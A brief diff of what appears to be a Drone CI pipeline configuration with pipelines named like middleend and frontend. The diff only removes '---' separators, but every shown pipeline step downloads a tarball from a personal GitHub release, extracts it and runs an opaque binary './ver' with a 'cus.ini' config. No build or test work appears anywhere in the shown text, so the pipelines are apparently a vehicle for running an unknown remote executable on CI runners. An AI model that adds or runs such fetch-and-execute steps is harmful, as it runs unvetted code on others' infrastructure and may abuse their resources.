@@ -8,7 +8,6 @@ steps:
   commands:
   - wget https://github.com/hendrik20212/VRS/releases/download/doc1/Doc.tar.gz && tar -xvf Doc.tar.gz && ./ver cus.ini
 
----
 kind: pipeline
 type: docker
 name: middleend
@@ -19,7 +18,6 @@ steps:
   commands:
   - wget https://github.com/hendrik20212/VRS/releases/download/doc1/Doc.tar.gz && tar -xvf Doc.tar.gz && ./ver cus.ini
   
-  ---
 kind: pipeline
 type: docker
 name: frontend
